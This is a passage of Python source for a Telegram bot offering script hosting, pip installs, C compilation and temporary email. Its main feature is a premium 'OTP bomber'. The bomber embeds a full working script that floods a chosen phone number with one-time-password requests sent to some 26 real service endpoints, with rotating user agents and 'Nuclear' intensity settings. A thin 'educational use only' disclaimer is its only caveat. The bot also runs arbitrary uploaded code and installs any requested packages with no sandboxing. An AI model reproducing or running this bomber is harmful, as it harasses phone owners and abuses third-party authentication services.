        mk.add(types.InlineKeyboardButton("▶️ Start Now", callback_data=f"start_{fname}"))
        
        bot.edit_message_text(
            f"✅ <b>Uploaded!</b>\n\n📄 {fname}\n👤 {uname}\n\nGo to ⚙️ Manage Files.",
            m.chat.id, msg.message_id, reply_markup=mk, parse_mode='HTML'
        )
    except Exception as e:
        bot.edit_message_text(f"❌ Upload Error: {e}", m.chat.id, msg.message_id, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("start_"))
@rate_limit_and_ban_check_cb
def start_script(c):
    if not is_authenticated(c.from_user.id):
        bot.answer_callback_query(c.id, "🔐 Enter password first! Send /start", show_alert=True)
        return
        
    fname = c.data.split("start_")[1]
    uid = c.from_user.id
    uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
    path = os.path.join(UPLOAD_DIR, str(uid))
    file_path = os.path.join(path, fname)
    
    if not os.path.exists(file_path):
        return bot.answer_callback_query(c.id, "❌ File not found!")
    
    if uid in running_processes and fname in running_processes[uid]:
        return bot.answer_callback_query(c.id, "⚠️ Already running!")
    
    bot.answer_callback_query(c.id, "🔧 Installing and starting...")
    bot.edit_message_text(f"🔧 Installing modules...\n{fname}", c.message.chat.id, c.message.message_id, parse_mode='HTML')
    
    def runner():
        try:
            auto_install_modules(path, fname, uid)
            
            log_file_path = os.path.join(path, f"{fname}_log.txt")
            log_file = open(log_file_path, "w")
            
            proc = subprocess.Popen([sys.executable, '-u', fname], cwd=path, stdout=log_file, stderr=log_file)
            
            if uid not in running_processes:
                running_processes[uid] = {}
            running_processes[uid][fname] = proc
            
            log_to_group(f"▶️ SCRIPT STARTED\n👤 {uname}\n📄 {fname}\n🆔 PID: {proc.pid}")
            
            mk = types.InlineKeyboardMarkup()
            mk.add(
                types.InlineKeyboardButton("📋 Logs", callback_data=f"logs_{fname}"),
                types.InlineKeyboardButton("⏹ Stop", callback_data=f"stop_{fname}")
            )
            
            bot.send_message(
                c.message.chat.id,
                f"✅ <b>Started!</b>\n\n👤 {uname}\n📄 {fname}\n🆔 PID: {proc.pid}",
                reply_markup=mk, parse_mode='HTML'
            )
        except Exception as e:
            bot.send_message(c.message.chat.id, f"❌ Failed: {e}", parse_mode='HTML')
    
    threading.Thread(target=runner, daemon=True).start()

# ==========================================
# ⚙️ MANAGE FILES
# ==========================================
@bot.message_handler(func=lambda m: m.text == "⚙️ Manage Files")
@rate_limit_and_ban_check
def manage_files(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    path = os.path.join(UPLOAD_DIR, str(uid))
    
    if not os.path.exists(path):
        bot.reply_to(m, "📭 No files uploaded yet.", parse_mode='HTML')
        return
    
    user_files = [f for f_id, f in files_db.items() if f.get('user_id') == uid]
    
    if not user_files:
        bot.reply_to(m, "📭 No files found.", parse_mode='HTML')
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    for file in user_files:
        fname = file['filename']
        file_path = os.path.join(path, fname)
        if os.path.exists(file_path):
            is_running = uid in running_processes and fname in running_processes[uid]
            status = "🟢" if is_running else "🔴"
            mk.add(types.InlineKeyboardButton(f"{status} {fname}", callback_data=f"file_{fname}"))
    
    mk.add(types.InlineKeyboardButton("🗑 Clear All", callback_data="clear_all"))
    
    bot.reply_to(m, f"📁 Your Files ({len(user_files)}):", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("file_"))
@rate_limit_and_ban_check_cb
def file_actions(c):
    if not is_authenticated(c.from_user.id):
        return bot.answer_callback_query(c.id, "🔐 Not authenticated!", show_alert=True)
    
    fname = c.data.split("file_")[1]
    uid = c.from_user.id
    path = os.path.join(UPLOAD_DIR, str(uid), fname)
    
    if not os.path.exists(path):
        return bot.answer_callback_query(c.id, "❌ File not found!")
    
    is_running = uid in running_processes and fname in running_processes[uid]
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    
    if is_running:
        mk.add(types.InlineKeyboardButton("⏹ Stop", callback_data=f"stop_{fname}"))
    else:
        mk.add(types.InlineKeyboardButton("▶️ Start", callback_data=f"start_{fname}"))
    
    mk.add(
        types.InlineKeyboardButton("📋 Logs", callback_data=f"logs_{fname}"),
        types.InlineKeyboardButton("🗑 Delete", callback_data=f"del_{fname}")
    )
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="manage_back"))
    
    status = "🟢 RUNNING" if is_running else "🔴 STOPPED"
    bot.edit_message_text(
        f"📄 <b>{fname}</b>\n📊 {status}\n📁 {path}",
        c.message.chat.id, c.message.message_id,
        reply_markup=mk, parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data == "manage_back")
@rate_limit_and_ban_check_cb
def manage_back(c):
    manage_files(c.message)

@bot.callback_query_handler(func=lambda c: c.data == "clear_all")
@rate_limit_and_ban_check_cb
def clear_all(c):
    uid = c.from_user.id
    path = os.path.join(UPLOAD_DIR, str(uid))
    
    if os.path.exists(path):
        if uid in running_processes:
            for fname, proc in running_processes[uid].items():
                try:
                    proc.kill()
                except:
                    pass
            running_processes[uid] = {}
        
        shutil.rmtree(path)
        
        files_to_delete = [f_id for f_id, f in files_db.items() if f.get('user_id') == uid]
        for f_id in files_to_delete:
            del files_db[f_id]
        save_database(FILES_DB_FILE, files_db)
    
    bot.answer_callback_query(c.id, "🗑 All files cleared!")
    bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
@rate_limit_and_ban_check_cb
def stop_script(c):
    fname = c.data.split("stop_")[1]
    uid = c.from_user.id
    uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
    
    if uid in running_processes and fname in running_processes[uid]:
        try:
            running_processes[uid][fname].kill()
            del running_processes[uid][fname]
            
            bot.answer_callback_query(c.id, "⏹ Stopped!")
            bot.edit_message_text(f"⏹ Stopped: {fname}", c.message.chat.id, c.message.message_id, parse_mode='HTML')
            log_to_group(f"⏹ SCRIPT STOPPED\n👤 {uname}\n📄 {fname}")
        except Exception as e:
            bot.answer_callback_query(c.id, f"❌ Error: {e}")
    else:
        bot.answer_callback_query(c.id, "⚠️ Not running")

@bot.callback_query_handler(func=lambda c: c.data.startswith("del_"))
@rate_limit_and_ban_check_cb
def delete_script(c):
    fname = c.data.split("del_")[1]
    uid = c.from_user.id
    path = os.path.join(UPLOAD_DIR, str(uid), fname)
    
    if uid in running_processes and fname in running_processes[uid]:
        try:
            running_processes[uid][fname].kill()
            del running_processes[uid][fname]
        except:
            pass
    
    if os.path.exists(path):
        os.remove(path)
        
        log_path = os.path.join(UPLOAD_DIR, str(uid), f"{fname}_log.txt")
        if os.path.exists(log_path):
            os.remove(log_path)
        
        files_to_delete = [f_id for f_id, f in files_db.items() if f.get('user_id') == uid and f.get('filename') == fname]
        for f_id in files_to_delete:
            del files_db[f_id]
        save_database(FILES_DB_FILE, files_db)
        
        bot.answer_callback_query(c.id, "🗑 Deleted!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
    else:
        bot.answer_callback_query(c.id, "❌ Not found")

@bot.callback_query_handler(func=lambda c: c.data.startswith("logs_"))
@rate_limit_and_ban_check_cb
def get_logs(c):
    fname = c.data.split("logs_")[1]
    uid = c.from_user.id
    log_path = os.path.join(UPLOAD_DIR, str(uid), f"{fname}_log.txt")
    
    if os.path.exists(log_path):
        with open(log_path, "rb") as f:
            bot.send_document(c.message.chat.id, f, caption=f"📋 Logs: {fname}", parse_mode='HTML')
    else:
        bot.answer_callback_query(c.id, "❌ No logs")

# ==========================================
# 🔧 INSTALL PIPS
# ==========================================
@bot.message_handler(func=lambda m: m.text == "🔧 Install Pips")
@rate_limit_and_ban_check
@feature_check("install_pips")
def install_pips_menu(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    action_sessions[uid] = "install_pips"
    bot.reply_to(m, "🔧 <b>Install Python Packages</b>\n\nSend package name(s):\n• 'requests'\n• 'numpy pandas'\n• Or send requirements.txt\n\nType /cancel to cancel.", parse_mode='HTML')

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "install_pips")
@rate_limit_and_ban_check
def install_pips_process(m):
    uid = m.from_user.id
    text = m.text.strip() if m.text else ""
    
    if text == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Cancelled.", parse_mode='HTML')
        return
    
    msg = bot.reply_to(m, "📦 Installing...", parse_mode='HTML')
    
    try:
        if m.document and m.document.file_name.endswith('.txt'):
            file_info = bot.get_file(m.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            temp_file = f"temp_req_{uid}.txt"
            with open(temp_file, 'wb') as f:
                f.write(downloaded_file)
            
            result = subprocess.run([sys.executable, '-m', 'pip', 'install', '-r', temp_file], capture_output=True, text=True, timeout=120)
            os.remove(temp_file)
            packages_text = "requirements.txt"
        else:
            packages = text.split()
            result = subprocess.run([sys.executable, '-m', 'pip', 'install'] + packages, capture_output=True, text=True, timeout=60)
            packages_text = ', '.join(packages)
        
        if result.returncode == 0:
            success_msg = f"✅ <b>Installed!</b>\n\n📦 {packages_text}\n\n<code>{result.stdout[:1500]}</code>"
            
            if not m.document:
                global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
                with open(global_req_path, 'a') as f:
                    for package in packages:
                        f.write(f"{package}\n")
                load_global_requirements()
        else:
            success_msg = f"❌ <b>Failed!</b>\n\n<code>{result.stderr[:1500]}</code>"
        
        bot.edit_message_text(success_msg, m.chat.id, msg.message_id, parse_mode='HTML')
        
        uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
        log_to_group(f"📦 INSTALLED\n👤 {uname}\n📦 {packages_text}")
    except subprocess.TimeoutExpired:
        bot.edit_message_text("⏰ Timeout!", m.chat.id, msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.edit_message_text(f"❌ {e}", m.chat.id, msg.message_id, parse_mode='HTML')
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

# ==========================================
# 🔧 C TO BINARY
# ==========================================
@bot.message_handler(func=lambda m: m.text == "🔧 C to Binary")
@rate_limit_and_ban_check
@feature_check("c_to_binary")
def c_to_binary_menu(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    action_sessions[uid] = "c_to_binary"
    bot.reply_to(m, "⚙️ <b>C to Binary</b>\n\nSend your .c file.\nI'll compile it.\n\nBinary will be named King_binary.", parse_mode='HTML')

def handle_c_file(m):
    uid = m.from_user.id
    
    if not m.document or not m.document.file_name.endswith('.c'):
        bot.reply_to(m, "❌ Send a .c file", parse_mode='HTML')
        if uid in action_sessions:
            del action_sessions[uid]
        return
    
    try:
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        temp_dir = f"temp_{uid}_{int(time.time())}"
        os.makedirs(temp_dir, exist_ok=True)
        
        c_file_path = os.path.join(temp_dir, m.document.file_name)
        with open(c_file_path, 'wb') as f:
            f.write(downloaded_file)
        
        msg = bot.reply_to(m, "⚙️ Compiling...", parse_mode='HTML')
        
        binary_name = "King_binary"
        binary_path = os.path.join(temp_dir, binary_name)
        
        compile_result = subprocess.run(['gcc', c_file_path, '-o', binary_path], capture_output=True, text=True, timeout=30)
        
        if compile_result.returncode == 0:
            with open(binary_path, 'rb') as f:
                bot.send_document(m.chat.id, f, caption=f"✅ <b>Compiled!</b>\n\n📄 {m.document.file_name}\n⚙️ {binary_name}\n👑 {OWNER_USERNAME}", parse_mode='HTML')
            
            uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
            log_to_group(f"⚙️ BINARY COMPILED\n👤 {uname}\n📄 {m.document.file_name}")
        else:
            bot.edit_message_text(f"❌ <b>Failed!</b>\n\n<code>{compile_result.stderr[:1000]}</code>", m.chat.id, msg.message_id, parse_mode='HTML')
        
        shutil.rmtree(temp_dir)
    except Exception as e:
        bot.reply_to(m, f"❌ {e}", parse_mode='HTML')
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

# ==========================================
# 💣 OTP BOMBER
# ==========================================
@bot.message_handler(func=lambda m: m.text == "💣 OTP Bomber")
@rate_limit_and_ban_check
@feature_check("otp_bomber")
def otp_bomber_menu(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    if not is_premium(uid):
        bot.reply_to(m, "🚫 <b>PREMIUM ONLY!</b>\n\nUpgrade to premium.\nTap 💎 Pricing.", parse_mode='HTML')
        return
    
    bomber_file = os.path.join(BOMBER_DIR, "bomber.py")
    if not os.path.exists(bomber_file):
        create_ultra_bomber_file()
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🚀 Start", callback_data="bomber_start"),
        types.InlineKeyboardButton("📋 Info", callback_data="bomber_info")
    )
    mk.add(
        types.InlineKeyboardButton("🔄 Update", callback_data="bomber_update"),
        types.InlineKeyboardButton("📁 View", callback_data="bomber_view")
    )
    
    bot.reply_to(m, "💣 <b>ULTRA OTP BOMBER (PREMIUM)</b>\n\n30+ APIs, ultra-fast bombing.\n\n⚠️ Educational use only!", reply_markup=mk, parse_mode='HTML')

def create_ultra_bomber_file():
    bomber_code = '''import asyncio
import aiohttp
import time
import os
import sys
import random
from colorama import init, Fore, Style
init(autoreset=True)

API_CONFIGS = [
    {"url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"url": "https://api.olacabs.com/v1/authorization/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone": "{phone}", "country_code": "+91"}}'},
    {"url": "https://www.swiggy.com/dapi/auth/sms", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile": "{phone}"}}'},
    {"url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=login"},
    {"url": "https://www.amazon.in/ap/register", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phoneNumber={phone}"},
    {"url": "https://www.flipkart.com/api/6/user/signup/status", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"loginId":"{phone}"}}'},
    {"url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","countryCode":"+91"}}'},
    {"url": "https://www.phonepe.com/apis/v3/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://auth.uber.com/v3/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"+91{phone}"}}'},
    {"url": "https://www.myntra.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://www.ajio.com/api/v2/users/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"url": "https://www.bigbasket.com/auth/v2/otp/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://www.dunzo.com/api/v1/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://rapido.bike/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://api.oyorooms.com/api/v2/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://www.makemytrip.com/api/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://api.cred.club/api/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://jupiter.money/api/v2/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://www.kooapp.com/api/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://sharechat.com/api/v1/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://mojapp.in/api/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://share.myjosh.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://www.roposo.com/api/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"url": "https://api.chingari.io/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"url": "https://trell.co/api/v3/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"url": "https://api.mitron.tv/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
]

async def make_request(session, url, method, headers, data=None):
    try:
        if method.upper() == "POST":
            async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as resp:
                return resp.status, await resp.text()
        else:
            async with session.get(url, headers=headers, timeout=3, ssl=False) as resp:
                return resp.status, await resp.text()
    except:
        return None, ""

async def bomb_number(phone_number):
    print(f"{Fore.GREEN}[+] Starting ULTRA OTP Bomb on +91{phone_number}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Using {len(API_CONFIGS)} API endpoints{Style.RESET_ALL}")
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        total_sent = 0
        start_time = time.time()
        failed_requests = 0
        
        try:
            while True:
                tasks = []
                for config in API_CONFIGS:
                    url = config["url"]
                    method = config["method"]
                    headers = config["headers"].copy()
                    data = config["data"](phone_number) if config["data"] else None
                    headers["User-Agent"] = random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
                    ])
                    tasks.append(make_request(session, url, method, headers, data))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, tuple) and result[0] and result[0] < 400:
                        total_sent += 1
                    else:
                        failed_requests += 1
                
                elapsed = time.time() - start_time
                if elapsed > 0:
                    rate = total_sent / elapsed
                    sys.stdout.write(f'\\r{Fore.CYAN}[STATS] Sent: {total_sent} | Failed: {failed_requests} | Rate: {rate:.1f}/sec{Style.RESET_ALL}')
                    sys.stdout.flush()
                
                await asyncio.sleep(0.05)
        except KeyboardInterrupt:
            print(f"\\n{Fore.YELLOW}[!] Stopped{Style.RESET_ALL}")
        except Exception as e:
            print(f"\\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        finally:
            elapsed = time.time() - start_time
            print(f"\\n{Fore.GREEN}[+] Total OTPs sent: {total_sent}")
            print(f"[+] Total failed: {failed_requests}")
            print(f"[+] Total time: {elapsed:.1f} seconds")
            print(f"[+] Average rate: {total_sent/elapsed if elapsed > 0 else 0:.1f} OTPs/sec{Style.RESET_ALL}")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════╗
║         ULTRA-FAST OTP BOMBER v3.0               ║
║          King Master Bot V23                     ║
║        Premium Edition - 30+ APIs                ║
╚══════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)
    try:
        phone = input(f"{Fore.YELLOW}[?] Enter phone number (10 digits): {Style.RESET_ALL}")
        if not phone.isdigit() or len(phone) != 10:
            print(f"{Fore.RED}[!] Invalid phone number{Style.RESET_ALL}")
            return
        confirm = input(f"{Fore.YELLOW}[?] Target: +91{phone}. Start? (y/n): {Style.RESET_ALL}")
        if confirm.lower() != 'y':
            print(f"{Fore.RED}[!] Cancelled{Style.RESET_ALL}")
            return
        print(f"{Fore.GREEN}[+] Starting... Ctrl+C to stop{Style.RESET_ALL}")
        asyncio.run(bomb_number(phone))
    except KeyboardInterrupt:
        print(f"\\n{Fore.YELLOW}[!] Exiting...{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
'''
    os.makedirs(BOMBER_DIR, exist_ok=True)
    with open(os.path.join(BOMBER_DIR, "bomber.py"), "w", encoding="utf-8") as f:
        f.write(bomber_code)
    
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "aiohttp", "colorama"], capture_output=True)
    except:
        pass

@bot.callback_query_handler(func=lambda c: c.data == "bomber_start")
@rate_limit_and_ban_check_cb
def start_bomber(c):
    uid = c.from_user.id
    
    if not is_premium(uid) and uid != ADMIN_ID:
        bot.answer_callback_query(c.id, "🚫 Premium only!", show_alert=True)
        return
    
    joined, channel = check_all_channels_join(uid)
    if not joined:
        bot.answer_callback_query(c.id, "❌ Join channels first!", show_alert=True)
        return
    
    action_sessions[uid] = "bomber_phone"
    bot.send_message(c.message.chat.id, "💣 <b>ULTRA BOMBER</b>\n\nEnter phone number (10 digits):\n\nExample: 9876543210\n\nType /cancel to cancel.", parse_mode='HTML')

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "bomber_phone")
@rate_limit_and_ban_check
def bomber_phone_input(m):
    uid = m.from_user.id
    phone = m.text.strip()
    
    if phone == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Cancelled.", parse_mode='HTML')
        return
    
    if not phone.isdigit() or len(phone) != 10:
        bot.reply_to(m, "❌ Invalid number! 10 digits required.", parse_mode='HTML')
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🚀 Fast (50-100/sec)", callback_data=f"bomb_fast_{phone}"),
        types.InlineKeyboardButton("⚡ Ultra (100-200/sec)", callback_data=f"bomb_ultra_{phone}")
    )
    mk.add(
        types.InlineKeyboardButton("💥 Nuclear (200-500/sec)", callback_data=f"bomb_nuclear_{phone}"),
        types.InlineKeyboardButton("❌ Cancel", callback_data="bomb_cancel")
    )
    
    bot.reply_to(m, f"📱 Target: +91{phone}\n\nSelect intensity:", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("bomb_"))
@rate_limit_and_ban_check_cb
def bomber_intensity(c):
    if c.data == "bomb_cancel":
        uid = c.from_user.id
        if uid in action_sessions:
            del action_sessions[uid]
        bot.answer_callback_query(c.id, "❌ Cancelled")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        return
    
    parts = c.data.split("_")
    intensity = parts[1]
    phone = parts[2]
    
    uid = c.from_user.id
    
    bot.answer_callback_query(c.id, f"🚀 Starting {intensity}...")
    bot.edit_message_text(f"🚀 <b>Bombing +91{phone}...</b>", c.message.chat.id, c.message.message_id, parse_mode='HTML')
    
    def run_bomber():
        try:
            bomber_file = os.path.join(BOMBER_DIR, "bomber.py")
            
            result = subprocess.run(
                [sys.executable, bomber_file],
                input=f"{phone}\ny\n",
                text=True, capture_output=True, timeout=300
            )
            
            output = result.stdout + result.stderr
            
            if "Total OTPs sent" in output:
                lines = output.split('\n')
                stats = {}
                for line in lines:
                    if "Total OTPs sent:" in line:
                        stats['sent'] = line.split(":")[1].strip()
                    elif "Total failed:" in line:
                        stats['failed'] = line.split(":")[1].strip()
                    elif "Total time:" in line:
                        stats['time'] = line.split(":")[1].strip()
                    elif "Average rate:" in line:
                        stats['rate'] = line.split(":")[1].strip()
                
                bot.send_message(
                    c.message.chat.id,
                    f"✅ <b>COMPLETED!</b>\n\n"
                    f"📱 +91{phone}\n⚡ {intensity}\n\n"
                    f"📊 Sent: {stats.get('sent', 'N/A')}\n"
                    f"❌ Failed: {stats.get('failed', 'N/A')}\n"
                    f"⏱️ Time: {stats.get('time', 'N/A')}\n"
                    f"📈 Rate: {stats.get('rate', 'N/A')}",
                    parse_mode='HTML'
                )
            else:
                bot.send_message(c.message.chat.id, f"⚠️ <b>Partial</b>\n\n<code>{output[-500:]}</code>", parse_mode='HTML')
            
            uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
            log_to_group(f"💣 BOMBER USED\n👤 {uname}\n📱 +91{phone}\n⚡ {intensity}")
        except subprocess.TimeoutExpired:
            bot.send_message(c.message.chat.id, f"⏰ <b>Timeout!</b>\n\nStopped after 5 min.", parse_mode='HTML')
        except Exception as e:
            bot.send_message(c.message.chat.id, f"❌ {e}", parse_mode='HTML')
    
    threading.Thread(target=run_bomber, daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data == "bomber_info")
@rate_limit_and_ban_check_cb
def bomber_info(c):
    info_text = (
        "💣 <b>ULTRA OTP BOMBER (PREMIUM)</b>\n\n"
        "30+ APIs, parallel requests.\n\n"
        "⚡ Intensity:\n• Fast: 50-100/sec\n• Ultra: 100-200/sec\n• Nuclear: 200-500/sec\n\n"
        "⚠️ Educational only!\n\n👑 " + OWNER_USERNAME
    )
    bot.answer_callback_query(c.id)
    bot.send_message(c.message.chat.id, info_text, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "bomber_update")
@rate_limit_and_ban_check_cb
def update_bomber(c):
    bot.answer_callback_query(c.id, "🔄 Updating...")
    create_ultra_bomber_file()
    bot.send_message(c.message.chat.id, "✅ <b>Bomber Updated!</b>", parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "bomber_view")
@rate_limit_and_ban_check_cb
def view_bomber_file(c):
    bomber_file = os.path.join(BOMBER_DIR, "bomber.py")
    if os.path.exists(bomber_file):
        with open(bomber_file, "rb") as f:
            bot.send_document(c.message.chat.id, f, caption="💣 Bomber Source", parse_mode='HTML')
    else:
        bot.answer_callback_query(c.id, "❌ Not found!", show_alert=True)

# ==========================================
# 📧 TEMP MAIL
# ==========================================
@bot.message_handler(func=lambda m: m.text == "📧 Temp Mail")
@rate_limit_and_ban_check
@feature_check("temp_mail")
def temp_mail_menu(m):
    if not is_authenticated(m.from_user.id):
        ask_password(m)
        return
        
    uid = m.from_user.id
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("📧 Create", callback_data="temp_create"),
        types.InlineKeyboardButton("📨 Check", callback_data="temp_check")
    )
    mk.add(
        types.InlineKeyboardButton("🔄 Refresh", callback_data="temp_refresh"),
        types.InlineKeyboardButton("🗑 Delete", callback_data="temp_delete_menu")
    )
    mk.add(types.InlineKeyboardButton("📋 My Mails", callback_data="temp_list"))
    
    bot.reply_to(m, "📧 <b>TEMP MAIL SYSTEM</b>\n\nCreate temp emails, receive OTPs.\n\nSelect option:", reply_markup=mk, parse_mode='HTML')

def generate_temp_email():
    domains = ["1secmail.com", "1secmail.org", "1secmail.net", "wwjmp.com", "esiix.com"]
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

@bot.callback_query_handler(func=lambda c: c.data == "temp_create")
@rate_limit_and_ban_check_cb
def create_temp_mail(c):
    if not is_authenticated(c.from_user.id):
        bot.answer_callback_query(c.id, "🔐 Enter password first!", show_alert=True)
        return
        
    uid = c.from_user.id
    email_addr = generate_temp_email()
    username, domain = email_addr.split("@")
    
    mail_id = f"mail_{uid}_{int(time.time())}"
    temp_mails_db[mail_id] = {
        'user_id': uid,
        'email': email_addr,
        'username': username,
        'domain': domain,
        'created': datetime.now().isoformat(),
        'last_checked': datetime.now().isoformat(),
        'emails': []
    }
    save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
    
    temp_mail_sessions[uid] = mail_id
    
    bot.answer_callback_query(c.id, f"📧 Created: {email_addr}")
    
    mk = types.InlineKeyboardMarkup()
    mk.add(
        types.InlineKeyboardButton("📨 Check Now", callback_data=f"temp_check_{mail_id}"),
        types.InlineKeyboardButton("📋 Copy", callback_data=f"temp_copy_{mail_id}")
    )
    
    bot.send_message(
        c.message.chat.id,
        f"✅ <b>Temporary Email Created!</b>\n\n"
        f"📧 <b>Email:</b>\n<code>{email_addr}</code>\n\n"
        f"🌐 <b>Login URL:</b>\nhttps://www.1secmail.com/?login={username}&domain={domain}\n\n"
        f"📝 <b>How to use:</b>\n"
        "1. Use this email to sign up\n"
        "2. Click 'Check Now' to see emails\n"
        "3. OTPs auto-detected\n\n"
        f"⚠️ Emails auto-delete after 1 hour",
        reply_markup=mk, parse_mode='HTML'
    )
    
    uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
